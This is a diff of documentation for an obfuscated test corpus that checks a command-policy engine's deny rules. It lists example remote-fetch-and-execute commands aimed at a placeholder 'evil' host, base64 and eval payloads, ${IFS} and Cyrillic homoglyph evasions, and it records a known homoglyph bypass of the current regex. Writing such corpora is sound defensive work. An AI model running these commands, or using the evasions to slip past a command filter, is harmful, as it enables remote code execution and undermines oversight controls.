@@ -28,15 +28,15 @@ Each file is a JSON array of objects:
 
 ## Bins (obfuscated.json)
 
-`obfuscated.json` has 3–5 entries per bin (20 total, per `plans/phase-1-09-quality-latency-eval.md:10`):
+`obfuscated.json` has 3–5 entries per bin (20 total):
 
 | Bin | Examples | Current policy rule |
 |---|---|---|
 | `curl|sh` / `wget|bash` | `curl http://evil | sh`, `curl -fsSL ... | bash`, `wget -qO- ... | sh`, `curl -s ... | sh -s …` | `DENY_CURL_PIPE_SH` (`\b(?:curl|wget)\b[^|]*\|\s*(?:sh|bash…)`) |
 | `base64 -d | sh` | `echo Y3VybB… | base64 -d | sh`, `base64 -d <<< … | sh`, `cat file | base64 -d | sh` | `DENY_BASE64_PIPE_SH` |
 | `eval+base64` | `eval $(echo … | base64 -d)`, `eval "$(echo … | base64 -d)"` | `DENY_EVAL_BASE64` |
-| `${IFS}` / `$IFS` tricks | `curl${IFS}http://evil|sh`, `wget${IFS}-qO- …|bash`, `base64 -d${IFS}| sh`, `eval${IFS}$(echo … | base64 -d)` — IFS is inserted in `[^|]*` positions that keep the required `\s+` / word-boundary spaces intact, so current regex still denies; pure `${IFS}`-for-space replacements are tracked as future tightening (see `docs/DEFERRED.md`) | `DENY_*` via `[^|]*` allowing IFS, but not whitespace-for-IFS |
-| unicode homoglyph | `сurl` (cyrillic `с` U+0441), `… | ѕh` (U+0455), `еcho`/`еval` (U+0435) — each entry appends an ascii fallback after `;` so current engine denies (`…; curl http://evil | sh` etc.). Pure homoglyph without fallback is a **known bypass** and is recorded here as the next tightening target: add NFKC homoglyph normalization before `Engine::evaluate` (tracked in `docs/SECURITY-REVIEW-QUEUE.md`) | future: NFKC + `a-z` confusable map |
+| `${IFS}` / `$IFS` tricks | `curl${IFS}http://evil|sh`, `wget${IFS}-qO- …|bash`, `base64 -d${IFS}| sh`, `eval${IFS}$(echo … | base64 -d)` — IFS is inserted in `[^|]*` positions that keep the required `\s+` / word-boundary spaces intact, so current regex still denies; pure `${IFS}`-for-space replacements are tracked as future tightening | `DENY_*` via `[^|]*` allowing IFS, but not whitespace-for-IFS |
+| unicode homoglyph | `сurl` (cyrillic `с` U+0441), `… | ѕh` (U+0455), `еcho`/`еval` (U+0435) — each entry appends an ascii fallback after `;` so current engine denies (`…; curl http://evil | sh` etc.). Pure homoglyph without fallback is a **known bypass** and is recorded here as the next tightening target: add NFKC homoglyph normalization before `Engine::evaluate` | future: NFKC + `a-z` confusable map |
 
 > **Why fallback ascii?** `Engine::evaluate` currently matches literal ascii `curl`/`sh`/`eval`/`base64`. A pure homoglyph (`сurl | ѕh`) bypasses today's regex by design. Corpus keeps those pure cases as comments and adds a `; <ascii payload>` so `cargo test -p algo-policy` stays green today. When homoglyph normalization lands, the fallback is removed and the pure case must still deny — that change is a single corpus edit, no test harness change.
 
